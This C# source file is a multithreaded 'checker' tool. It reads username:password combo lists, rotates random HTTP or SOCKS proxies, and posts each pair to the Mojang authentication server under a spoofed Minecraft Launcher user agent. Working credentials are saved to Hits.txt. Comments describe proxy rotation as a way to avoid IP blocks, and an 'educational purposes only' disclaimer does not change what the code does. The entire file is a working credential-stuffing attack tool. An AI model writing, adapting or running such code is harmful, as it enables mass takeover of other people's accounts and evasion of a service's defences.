using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Drawing;
using System.Threading;
using System.Text;
using Leaf.xNet;
using Leaf.xNet.Services;
using Newtonsoft.Json;
using Colorful;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;

namespace CSharp_Checker_Layout
{
    class Program
    {
        // Global variables that we'll need to display information to the screen, includes the amount x checked, the amount of x hits, and x retries.
        private static int checkeds;
        private static int invalid;
        private static int hits;
        private static int retries;
        private static string string_0 = string.Empty;
        private static string string_1 = string.Empty;
        // Putting the information into list types
        private static List<string> accounts;
        private static List<string> proxies;
        private static int threads;
        private static string pType; // Proxy type, we will need this for making requests to websites. (HTTP, SOCKS4, SOCKS5, PROXYLESS)
        private static CookieStorage cookies;

        static void Main(string[] args)
        {
            // General testing if the stuff we need is available.
            try
            {
                Program.accounts = File.ReadLines("accounts.txt").ToList<string>();
            }
            catch { Colorful.Console.WriteLine("[!] accounts.txt is not valid", Color.Orange); Thread.Sleep(-1); }

            try
            {
                // Prompting for what protocol the user wants to use, either HTTP, SOCKS4, SOCKS5.
                for (; Program.pType != "HTTP" && Program.pType != "SOCKS4" && Program.pType != "SOCKS5" && Program.pType != "NONE"; Program.pType = Colorful.Console.ReadLine())
                    Colorful.Console.Write("Proxy type (HTTP/SOCKS4/SOCKS5/NONE): ");
                Program.proxies = File.ReadLines("proxies.txt").ToList<string>();
            }
            catch { Colorful.Console.WriteLine("[!] proxies.txt is not valid", Color.Orange); Thread.Sleep(-1); }

            do
            {
                Colorful.Console.Write("Threads: ");
            }
            while (!int.TryParse(Colorful.Console.ReadLine(), out Program.threads)); // Passing the user input through to our variable.

            try
            {
                Program.MakeRequest((IEnumerable<string>)Program.accounts);
            } catch (Exception ex)
            {
                Colorful.Console.WriteLine(ex);
            }
        }

        private static void MakeRequest(IEnumerable<string> combo)
        {
            ParallelOptions parallelOptions = new ParallelOptions()
            {
                MaxDegreeOfParallelism = Program.threads
            };

            Parallel.ForEach<string>(combo, parallelOptions, (Action<string>)(account =>
            {
                try
                {
                    
                    if (account == "")
                    {
                        ++Program.checkeds;
                    }
                    else if (account.Contains(":"))
                    {
                        string_0 = account.Split(':')[0];
                        string_1 = account.Split(':')[1];
                    }
                    else
                    {
                        Colorful.Console.WriteLine("[!] Possible ascii characters detected, invalid or not cleaned line.", Color.Orange);
                    }
                } catch(Exception ex)
                {
                    Colorful.Console.WriteLine(ex, Color.Red);
                }
                try
                {
                    Colorful.Console.Title = string.Format("Developed by Fergs | Checked: {0}/{1} - Hits: {2} - Proxy errors: {3}", (object)Program.checkeds, (object)Program.accounts.Count, (object)Program.hits, (object)Program.retries);
                }
                catch
                {
                }
                try
                {
                    using (Leaf.xNet.HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req); // Instead of making the settings in this area, we can save the mess and create a method for it.
                        req.IgnoreProtocolErrors = true; // If false, will spam you with protocol errors either due to poop proxies or bad requests.
                        req.Cookies = (CookieStorage)null; // Just incase site needs cookies
                        req.UserAgent = "Minecraft Launcher/2.1.1351 (6371f5d03a) Windows (10.0; x86)";
                        req.AddHeader("Accept", "application/json, text/plain, */*");
                        // This is an example, FOR EDUCATIONAL PURPOSES ONLY. This post request will post to the mojang authentication server and contain a formatted content string. 
                        string str = req.Post("https://authserver.mojang.com/authenticate", "{\"agent\": {\"name\": \"Minecraft\",\"version\": 1},\"username\": \"" + string_0 + "\",\"password\": \"" + string_1 + "\",\"requestUser\": \"true\"}", "application/json;charset=UTF-8").ToString();
                        if (str.Contains("selectedProfile") || str.Contains("name") || str.Contains("accessToken"))
                        {
                            // This will deserialize the json object which is returned to us in the post request we made above, this will convert it to readable text that we understand.
                            JObject jobject = (JObject)JsonConvert.DeserializeObject(str);
                            if (jobject == null)
                            {
                                req.Dispose();
                            } else
                            {
                                string IGN = (string)jobject["selectedProfile"]["name"]; // Some bullshit jobject deseralizion bs, basically un-obf
                                string TypeCheck = (string)jobject["accessToken"];
                                hits++;
                                SaveHits(string_0, string_1);
                            }
                        }
                        else
                        {
                            Colorful.Console.WriteLine("[!] " + string_0 + ":" + string_1, Color.Red);
                            invalid++;
                        }
                    }
                } catch
                {
                    retries++;
                }
            }));
        }

        public static void SaveHits(string email, string password)
        {
            // Simple saving method, takes email, password input and will put it into a txt instead of you copying from the screen.
            using (StreamWriter output = new StreamWriter("Hits.txt"))
            {
                output.WriteLine(email + ":" + password);
            }
        }

        private static void SetBasicRequestSettingsAndProxies(Leaf.xNet.HttpRequest req)
        {
            req.IgnoreProtocolErrors = true;
            req.ConnectTimeout = 10000;
            req.KeepAliveTimeout = 10000;
            req.ReadWriteTimeout = 10000;
            if (!(Program.pType != "NONE"))
                return;
            // We need to randomize the proxies we send to websites, because they will eventually block the proxy IP slowly. But if we do random it will take a while for them to do so.
            string[] strArray = Program.proxies[new Random().Next(Program.proxies.Count)].Split(':');
            ProxyClient proxyClient = Program.pType == "SOCKS5" ? (ProxyClient)new Socks5ProxyClient(strArray[0], int.Parse(strArray[1])) : (Program.pType == "SOCKS4" ? (ProxyClient)new Socks4ProxyClient(strArray[0], int.Parse(strArray[1])) : (ProxyClient)new HttpProxyClient(strArray[0], int.Parse(strArray[1])));
            if (strArray.Length == 4)
            {
                // Some proxies require username:password, so I've implemented a user:pass auth to allow them connections.
                proxyClient.Username = strArray[2];
                proxyClient.Password = strArray[3];
            }
            req.Proxy = proxyClient;
        }

    }
}
